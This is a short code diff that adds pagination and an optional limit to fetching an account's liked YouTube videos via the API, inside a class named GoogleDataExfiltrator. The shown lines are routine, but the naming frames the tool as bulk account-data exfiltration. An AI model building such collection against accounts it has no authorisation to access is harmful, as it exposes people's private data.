@@ -755,3 +755,18 @@ class GoogleDataExfiltrator:
                 results = self.services['youtube'].videos().list(
                     part='snippet,contentDetails,statistics',
                     myRating='like',
+                    maxResults=50,
+                    pageToken=page_token
+                ).execute()
+                
+                liked_videos.extend(results.get('items', []))
+                page_token = results.get('nextPageToken')
+                
+                # Apply limit
+                if video_limit and len(liked_videos) >= video_limit:
+                    liked_videos = liked_videos[:video_limit]
+                    print(f"[!] Limited to {video_limit} liked videos")
+                    break
+                
+                if not page_token:
+                    break
